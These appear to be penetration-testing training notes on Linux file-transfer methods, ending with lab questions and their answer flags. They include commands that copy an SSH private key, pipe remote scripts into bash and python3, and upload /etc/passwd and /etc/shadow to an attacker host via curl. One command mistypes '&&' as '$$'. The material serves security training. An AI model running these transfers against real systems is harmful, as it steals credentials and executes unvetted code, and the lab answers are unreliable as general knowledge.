# Linux File Transfer Methods
## PowerShell Base64 Encode & Decode
If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. We can use `md5sum` to calculate and verifie 128-bit MD5 checksums for integrity check.
1. **Check MD5Hash of file to transfer**
    ```
    $ md5sum id_rsa

    4e301756a07ded0a2dd6953abf015278  id_rsa
    ```
2. **Encode the file content to Base64**
    ```
    $ cat id_rsa |base64 -w 0;echo

    LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRU...
    ```
3. **Decode the copied file's content in Base64**
   ```
   $ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRU...'  | base64 -d > id_rsa
   ```
4. **Confirm the MD5 Hashes Match**
   ```
   $ md5sum id_rsa

   4e301756a07ded0a2dd6953abf015278  id_rsa
   ```

## Web Downloads with Wget and cURL
**Download a File Using wget**

```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download a File Using cURL**

```
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux
**Fileless Download with cURL**

```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

**Fileless Download with wget**

```
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)
As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

**Connect to the Target Webserver**

```
$ exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**

```
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**

```
$ cat <&3
```

## SSH Downloads
SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

1. **Host - Enabling the SSH Server**
```
$ sudo systemctl enable ssh
```
2. **Host - Starting the SSH Server**
```
$ sudo systemctl start ssh
```
3. **Host - Checking for SSH Listening Port**
```
$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```
4. **Target - Downloading Files Using SCP**
```
$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Web Upload
Config uploadserver module to use HTTPS for secure communication:
1. **Host - Start Web Server**
```
$ sudo python3 -m pip install --user uploadserver
```
2. **Host - Create a Self-Signed Certificate**
```
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
3. **Host - Start Web Server**
```
$ mkdir https && cd https
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
4. **Target - Upload Multiple Files**
```
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Linux - Creating a Web Server with Python3
```
$ python3 -m http.server
```
### Linux - Creating a Web Server with Python2.7
```
$ python2.7 -m SimpleHTTPServer
```
### Linux - Creating a Web Server with PHP
```
$ php -S 0.0.0.0:8000
```
### Linux - Creating a Web Server with Ruby
```
$ ruby -run -ehttpd . -p8000
```

## SCP Upload
```
$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## Questions
1. Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer. **Answer: 5d21cf3da9c0ccb94f709e2559f3ea50**
   - `$ curl -o flag.txt http://10.129.42.154/flag.txt`
2. Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run `hasher <extracted file>` from the command line. Submit the generated hash as your answer. **Answer: 159cfe5c65054bbadb2761cfa359c8b0**
   - At host, download the file named upload_nix.zip and use SCP to upload that file to the target `$ scp upload_nix.zip htb-student@<target_IP>:/home/htb-student`
   - At the target machine, unzip that file and calculate the hash: `$ gunzip -S .zip upload_nix.zip $$ hasher upload_nix`
3. Connect to the target machine via SSH and practice various file transfer operations (upload and download) with your attack host (workstation). Type "DONE" when finished. **Answer: DONE**